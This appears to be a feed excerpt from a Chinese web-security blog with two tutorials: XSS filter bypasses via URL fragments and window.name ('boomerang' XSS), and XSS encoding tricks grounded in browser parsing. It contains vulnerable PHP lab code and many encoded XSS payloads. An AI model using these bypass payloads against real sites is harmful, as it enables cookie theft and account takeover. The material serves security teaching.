    <id>https://www.mi1k7ea.com/2020/04/07/跨域通信中的XSS利用/</id>
    <published>2020-04-07T14:48:22.000Z</published>
    <updated>2020-04-07T15:26:08.996Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>由于SOP（同源策略）的限制，当父iframe和自iframe不同源时，是无法直接进行通信的。</p><p>对于完全不同源的网站，目前有以下三种方法来解决跨域窗口的通信问题：</p><ul><li>片段标识符fragment；</li><li>window.name；</li><li>window.postMessage；</li></ul><p>其中前两种方法可以在为我们的XSS攻击所利用，第三种主要是postMessage跨域漏洞。</p><p>接下来看看如何利用前面两种方法绕过XSS过滤限制的问题。</p><h2 id="0x02-片段标识符（fragment）"><a href="#0x02-片段标识符（fragment）" class="headerlink" title="0x02 片段标识符（fragment）"></a>0x02 片段标识符（fragment）</h2><p>片段标识符是指在URL中<code>#</code>号之后的内容，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a.com/a.php#fragment</span><br></pre></td></tr></table></figure><p>在发起GET请求时，这部分内容并不会传给服务器，所以对服务端来说这部分是透明的。</p><p>父窗口可以将消息写入子窗口的片段标识符中来进行跨域通信。</p><p>看个例子，假设存在如下条件：</p><ul><li>可控点未过滤eval、location.hash.slice/substr、()等；</li><li>针对XSS的防御在服务端实现；</li><li>可控点存在长度限制，需要小于28个字节；</li></ul><p>代码如下，xss1.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$username = <span class="string">"admin"</span>;</span><br><span class="line">$password = <span class="string">"31289ufj123jrfj9jks190fiu"</span>;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"username"</span>, $username);</span><br><span class="line">setcookie(<span class="string">"password"</span>, $password);</span><br><span class="line"></span><br><span class="line">$x = $_GET[<span class="string">'x'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/script|javascript|data|document|focus|&amp;|&lt;|&gt;/i'</span>, $x)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"No Hacker!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($x) &gt; <span class="number">28</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Too Long!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;a href='#' onclick='$x'&gt;Click me&lt;/a&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先尝试插入正常的payload，即<code>http://127.0.0.1/xss1.php?x=javascript:alert(document.cookie)</code>，会发现被过滤了：</p><p><img src="/2020/04/07/跨域通信中的XSS利用/1.png" alt=""></p><p>此时，我们尝试使用片段标识符来绕过。由于片段标识符中的内容不会被传到服务端，当客户端没有对XSS关键字进行过滤时，我们可以利用fragment来将payload隐藏起来，从而绕过服务端的过滤。</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// ok</span><br><span class="line">http://127.0.0.1/xss1.php?x=eval(location.hash.slice(1))#javascript:alert(document.cookie)</span><br><span class="line">// failed，超过长度限制</span><br><span class="line">http://127.0.0.1/xss1.php?x=eval(location.hash.substr(1))#javascript:alert(document.cookie)</span><br></pre></td></tr></table></figure><p><img src="/2020/04/07/跨域通信中的XSS利用/2.png" alt=""></p><p>注意，这里必须要使用eval()来执行，因为slice()返回的仅仅是字符串内容。</p><h2 id="0x03-window-name——回旋镖XSS"><a href="#0x03-window-name——回旋镖XSS" class="headerlink" title="0x03 window.name——回旋镖XSS"></a>0x03 window.name——回旋镖XSS</h2><p>当向页面嵌入一个iframe时，可以指定该iframe的name，同时子iframe也可以获取到该name值。</p><p>以window.name为媒介，父iframe和子iframe就可以进行跨域通信了。</p><p>与fragment类似，iframe的name值同样不会发往服务端，此外，还拥有更多的优点：</p><ul><li>无需用到eval、location.hash.slice/substr、()等敏感关键词；</li><li>长度仅为20个字节；</li><li>不会受到客户端校验的影响；</li><li>可以将一个反射型XSS提升为存储型XSS；</li></ul><p>代码如下，xss2.php，只是将前面过滤的规则添加了eval和()、将字符长度限制缩小为20：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$username = <span class="string">"admin"</span>;</span><br><span class="line">$password = <span class="string">"31289ufj123jrfj9jks190fiu"</span>;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"username"</span>, $username);</span><br><span class="line">setcookie(<span class="string">"password"</span>, $password);</span><br><span class="line"></span><br><span class="line">$x = $_GET[<span class="string">'x'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/script|javascript|data|document|focus|&amp;|&lt;|&gt;|\(|\)|eval/i'</span>, $x)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"No Hacker!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($x) &gt; <span class="number">20</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Too Long!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;a href='#' onclick='$x'&gt;Click me&lt;/a&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正常payload或者fragment的payload访问都会被过滤掉，并且payload长度也是远超限制的：</p><p><img src="/2020/04/07/跨域通信中的XSS利用/3.png" alt=""></p><p>此时可以采用回旋镖XSS。</p><p>攻击者在自己的网站新建一个xss.html，通过iframe将目标页面引入，name属性值写入XSS payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://192.168.43.201/xss2.php?x=location=window.name"</span> <span class="attr">name</span>=<span class="string">"javascript:alert(document.cookie)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后诱使用户访问攻击者的xss.html页面再点击Click me即可触发XSS：</p><p><img src="/2020/04/07/跨域通信中的XSS利用/4.png" alt=""></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://xz.aliyun.com/t/311" target="_blank" rel="noopener">XSS Bypass Cookbook</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://www.mi1k7ea.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>从浏览器解析原理看XSS</title>
    <link href="https://www.mi1k7ea.com/2020/04/06/%E4%BB%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86%E7%9C%8BXSS/"/>
    <id>https://www.mi1k7ea.com/2020/04/06/从浏览器解析原理看XSS/</id>
    <published>2020-04-06T14:27:31.000Z</published>
    <updated>2020-04-07T14:46:31.779Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>PS：本文参考的pigpig的学习笔记。</p><p>XSS漏洞挖掘的背后，需要我们深入理解浏览器解析原理以及字符编码。</p><p>这里我们就从浏览器解析原理来进一步了解XSS的更多细节。</p><h2 id="0x01-浏览器自解码机制"><a href="#0x01-浏览器自解码机制" class="headerlink" title="0x01 浏览器自解码机制"></a>0x01 浏览器自解码机制</h2><p>浏览器在解析HTML文档时无论按照什么顺序，主要有三个过程：HTML解析、CSS解析、JS解析和URL解析，每个解析器负责HTML文档中各自对应部分的解析工作。</p><p>解析过程具体如下：</p><ol><li>HTML解析：浏览器接收到一个HTML文档时，会使用HTML解析器对HTML文档进行语法解析，完成HTML编码、并创建DOM树；</li><li>JavaScript/CSS解析：JavaScript解析器或CSS解析器，对内嵌脚本进行解析，并完成解码工作；</li><li>URL解析：当浏览器遇到需要URL的上下文环境时，URL解析器也会介入URL的解码工作中。不过URL解析器的解码顺序会根据URL所在位置的不同，工作与JavaScript解析器之前或之后；</li></ol><p><img src="/2020/04/06/从浏览器解析原理看XSS/3.png" alt=""></p><p>从图中可以看出浏览器主要做了三部分的工作：<br>  1. HTML/SVG/XHTML 解析。解析这三种文件会产生一个DOM Tree。<br>  2. CSS 解析，解析CSS会产生CSS规则树。<br>  3. Javascript 解析。（暂时讨论JavaScript动态操作DOM Tree）。<br>  4. URL解析。（这一步的先后顺序不一定，看语境）</p><h2 id="0x02-编码"><a href="#0x02-编码" class="headerlink" title="0x02 编码"></a>0x02 编码</h2><h3 id="HTML字符实体"><a href="#HTML字符实体" class="headerlink" title="HTML字符实体"></a>HTML字符实体</h3><p>在HTML页面中，某些特殊字符并不能直接显示，比如<code>&lt;</code>、<code>&gt;</code>等，浏览器会误认为是标签的开始或结束。如果需要在HTML页面中呈现特殊字符，需要使用它所对应的字符实体。</p><p>字符实体是一个预先定义好的转义序列，它定义了一些无法在文本内容中输入的字符或符号，主要有两种表示方式：</p><ul><li>实体名称：以<code>&amp;</code>开头+预先定义的实体名称+<code>;</code>符号，比如<code>&lt;</code>的实体名称为<code>&amp;lt;</code>；</li><li>实体编号：以<code>&amp;</code>开头+<code>#</code>符号+字符的十进制数（或十六进制数）+<code>;</code>符号，比如<code>&lt;</code>的实体名称为<code>&amp;#60;</code>；</li></ul><h3 id="JavaScript编码"><a href="#JavaScript编码" class="headerlink" title="JavaScript编码"></a>JavaScript编码</h3><p>最常用的Unicode转义序列<code>\uxxxx</code>，其中xxxx表示一个16进制数字，比如<code>&lt;</code>的Unicode编码为<code>\u003c</code>。</p><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p><code>%</code>+字符的ASCII编码所对应的2位16进制数，比如<code>/</code>的URL编码为<code>%2f</code>。</p><h2 id="0x03-解析器"><a href="#0x03-解析器" class="headerlink" title="0x03 解析器"></a>0x03 解析器</h2><h3 id="HTML解析器"><a href="#HTML解析器" class="headerlink" title="HTML解析器"></a>HTML解析器</h3><p>HTML中有五类元素：</p><ol><li>空元素(Void elements)，如<code>&lt;area&gt;</code>,<code>&lt;br&gt;</code>,<code>&lt;base&gt;</code>等等</li><li>原始文本元素(Raw text elements)，有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></li><li>RCDATA元素(RCDATA elements)，有<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code></li><li>外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素</li><li>基本元素(Normal elements)，即除了以上4种元素以外的元素</li></ol><p>五类元素的区别如下：</p><ol><li>空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</li><li>原始文本元素，可以容纳文本。</li><li>RCDATA元素，可以容纳文本和字符引用。</li><li>外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释</li><li>基本元素，可以容纳文本、字符引用、其他元素和注释</li></ol><p>HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个<code>&lt;</code>符号（后面没有跟<code>/</code>符号）就会进入“标签开始状态(Tag open state)”。然后转变到“标签名状态(Tag name state)”，“前属性名状态(before attribute name state)”……最后进入“数据状态(Data state)”并释放当前标签的token。当解析器处于“数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。</p><p><img src="/2020/04/06/从浏览器解析原理看XSS/2.png" alt=""></p><p>举个例子：存在<code>&lt;h1&gt;test&lt;/h1&gt;</code> ，首先状态机吃下<code>&lt;</code> 进入标签开始状态然后转变到标签名状态开始匹配标签</p><p>当吃进去<code>/&gt;</code>标签的时候进入标签结束状态然后进入<code>Data state</code>状态。</p><p>一般来说HTML编码需要在<code>Data State</code> 状态下进行。例如如果存在<code>&lt;&amp;#104;1&gt;test&lt;/h1&gt;</code> 那么就无法解析这个编码。但是如果是<code>&lt;h1&gt;tes&amp;#116;&lt;/h1&gt;</code> 却能够正确成功的解析。</p><p>HTML状态机可容纳<code>RCDATA</code>状态中的字符引用，这意味着在<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>标签中的字符引用会被HTML解析器解码，对<code>RCDATA</code>有个特殊的情况。在浏览器解析<code>RCDATA</code>元素的过程中，解析器会进入<code>“RCDATA状态”</code>。在这个状态中，如果遇到<code>&lt;</code>字符，它会转换到RCDATA小于号状态。如果<code>&lt;</code>字符后没有紧跟着<code>/</code>和对应的标签名，解析器会转换回<code>RCDATA状态</code>。这意味着在<code>RCDATA</code>元素标签的内容中（例如<code>&lt;textarea&gt;</code>或<code>&lt;title&gt;</code>的内容中），唯一能够被解析器认做是标签的就是<code>&lt;/textarea&gt;</code>或者<code>&lt;/title&gt;</code>。当然，这要看开始标签是哪一个。因此，在<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>的内容中不会创建标签，不会有脚本执行。</p><p>在建立好DOM语法树之后浏览器开始进行URL或者JavaScript解码。这意味着你如果在JS标签中使用HTML实体编码是没有用的，例如：<code>&lt;script&gt;alert&amp;#40;&#39;1&#39;)&lt;/script&gt;</code>。</p><h3 id="JavaScript解析器"><a href="#JavaScript解析器" class="headerlink" title="JavaScript解析器"></a>JavaScript解析器</h3><p>JavaScript中可以使用Unicode转义序列<code>\uxxxx</code>来表示一个字符，xxxx表示一个16进制数字。比如<code>&lt;</code>的Unicode编码为<code>\u003c</code>。</p><p>下面看下几个payload。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个payload是无法执行的，因为在JavaScript中，单引号、双引号和小括号都是属于控制字符，编码后将无法识别。</p><p>改成如下payload即可成功执行：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">\u0061\u006c\u0065\u0072\u0074(</span>'\<span class="attr">u0031</span>')&gt;</span></span><br></pre></td></tr></table></figure><p>结合HTML编码，还可以将payload进行实体化：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;c&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#50;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#52;&amp;#40;&amp;#39;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#51;&amp;#49;&amp;#39;&amp;#41;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时，执行顺序为：HTML解码–&gt;JavaScript解码–&gt;弹框。</p><p>注意：编码之间的转换使用<a href="https://evilcos.me/lab/xssor/" target="_blank" rel="noopener">XSS’OR工具</a>即可。</p><h3 id="CSS解析器"><a href="#CSS解析器" class="headerlink" title="CSS解析器"></a>CSS解析器</h3><blockquote><p>一般来说，CSS 解析器会做接下来的工作，不过一般来说，为了考虑到更好的体验和性能，并不会等到所有的html都解析完成之后再去构建和布局render树。它是解析完一部分内容就显示一部分内容，同时，可能还在通过网络下载其余内容。</p><p>当然CSS不会干扰到DOM 树的建立，他会结合CSS文件和style 标签，以及HTML中的课件指令来构建起reder tree。这里JavaScrit 的 CSSOM api 也会出一些力。</p><p>CSS 编码解析是用了一套不太正统的转义策略：<strong>用一个反斜杠，后边跟1~6位十六进制数字构成。</strong>，所以字母e 可以编码为 \65, \065,\000065。而因为这样，后边就不能直接紧跟数字或字母，否则会被当成转义里的内容处理，所以CSS 选择了空格作为终止标识，在解码的时候，再将空格去除。</p><p>同时，CSS还支持直接使用反斜杠对非十六进制字符进行转义的方式，就按紧跟着反斜杠后边的字符的字面意思进行解释，这种机制可用来转义引号和反斜杠本身，不过不能转义HTML 控制的字符，比如尖括号，那是因为HTML 解析器总是先于CSS 解析器。</p><p>由于CSS 转义规定的语焉不详，许多解析器会对本该用引号括起来的字符串进行任意的转义，特别的，在IE 浏览器里，这种转义优先级高于伪函数语法，于是下边两种情况的写法是一样的：</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">color</span><span class="selector-pseudo">:expression(alert(1))</span></span><br><span class="line"><span class="selector-tag">color</span><span class="selector-pseudo">:expression</span>\028 <span class="selector-tag">alert</span> \028 1 \029 \029</span><br></pre></td></tr></table></figure><h3 id="URL解析器"><a href="#URL解析器" class="headerlink" title="URL解析器"></a>URL解析器</h3><p>假设有payload如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(0)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>浏览器遇到<code>&lt;</code>时使用HTML解析器来解析，遇到href时使用URL解析器来解析，再遇到JavaScript时使用JavaScript解析器来解析。</p><p>我们可以按照浏览器的思维，反过来构造payload。</p><p>首先进行JavaScript编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074(0)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后进行URL编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(0)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后进行HTML编码（十进制和十六进制表示都OK）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x30;&amp;#x29;"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">或</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#49;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#54;&amp;#51;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#53;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#50;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#52;&amp;#40;&amp;#48;&amp;#41;"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x04-从Payload理解浏览器解析"><a href="#0x04-从Payload理解浏览器解析" class="headerlink" title="0x04 从Payload理解浏览器解析"></a>0x04 从Payload理解浏览器解析</h2><h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><p>对<code>javascript:alert(0)</code>进行URL编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%30%29"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样的payload是无法成功执行的，因为在URL解析器工作时，不能对协议类型进行任何的编码操作，否则URL解析器会认为它是无类型的，从而导致JavaScript没有被解码，自然也就不会被URL解析器所识别了。</p><p>URL规定协议、用户名、密码都必须是ASCII，编码当然就无效了。</p><blockquote><p>A URL’s scheme is an ASCII string that identifies the type of URL and can be used to dispatch a URL for further processing after parsing. It is initially the empty string.</p><p>A URL’s username is an ASCII string identifying a username. It is initially the empty string.</p><p>A URL’s password is an ASCII string identifying a password. It is initially the empty string.</p><p>from <a href="https://url.spec.whatwg.org/#concept-url" target="_blank" rel="noopener">https://url.spec.whatwg.org/#concept-url</a></p></blockquote><h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><p>先对JavaScript进行HTML编码，然后对<code>alert(0)</code>进行URL编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:%61%6c%65%72%74%28%30%29"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该payload能正常执行，因为HTML解析器先进行HTML解码，接下来URL解析器解析到href中的URL时，由于JavaScript已经被HTML解码了，因此URL解析器得到并识别了JavaScript协议，从而对后续内容进行URL解码。</p><h3 id="payload3"><a href="#payload3" class="headerlink" title="payload3"></a>payload3</h3><p>对<code>:</code>进行URL编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript%3aalert(0)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该payload无法执行，理由用payload1，因为URL协议必须是ASCII，不能进行任何的编码（javascript:）。</p><h3 id="payload4"><a href="#payload4" class="headerlink" title="payload4"></a>payload4</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&amp;#60;img src=x onerror=alert(0)&amp;#62;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里包含了HTML编码内容，反过来以开发者的角度思考，HTML编码就是为了显示这些特殊字符，而不干扰正常的DOM解析，所以这里面的内容不会变成一个img元素，也不会被执行。</p><p>从HTML解析机制看，在读取<code>&lt;div&gt;</code>之后进入数据状态，<code>&amp;#60;</code>会被HTML解码，但不会进入标签开始状态，当然也就不会创建<code>img</code>元素，也就不会执行。</p><h3 id="payload5"><a href="#payload5" class="headerlink" title="payload5"></a>payload5</h3><p>在textarea标签中内嵌script标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(0)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该payload无法执行，因为textarea标签中的所有内容均为纯文本形式。</p><p><code>&lt;textarea&gt;</code>是<code>RCDATA</code>元素（RCDATA elements），可以容纳文本和字符引用，注意<strong>不能容纳其他元素</strong>，直接显示。</p><p>注意：<code>RCDATA</code>元素（RCDATA elements）包括<code>textarea</code>和<code>title</code>。</p><h3 id="payload6"><a href="#payload6" class="headerlink" title="payload6"></a>payload6</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"confirm('0\u0027);"</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该payload无法执行，因为在JavaScript中不能对控制字符进行JavaScript编码，比如单引号、双引号、圆括号等。</p><blockquote><p>In string literals, regular expression literals, template literals and identifiers, any Unicode code point may also be expressed using Unicode escape sequences that explicitly express a code point’s numeric value.</p><p>from <a href="https://www.ecma-international.org/ecma-262/10.0/index.html#sec-ecmascript-language-source-code" target="_blank" rel="noopener">https://www.ecma-international.org/ecma-262/10.0/index.html#sec-ecmascript-language-source-code</a> （这个链接很卡）</p><p>标识符（identifiers）</p><p>代码中用来标识变量、函数、或属性的字符序列。</p><p>在JavaScript中，标识符只能包含字母或数字或下划线（“_”）或美元符号（“$”），且不能以数字开头。标识符与字符串不同之处在于字符串是数据，而标识符是代码的一部分。在 JavaScript 中，无法将标识符转换为字符串，但有时可以将字符串解析为标识符。</p><p>from <a 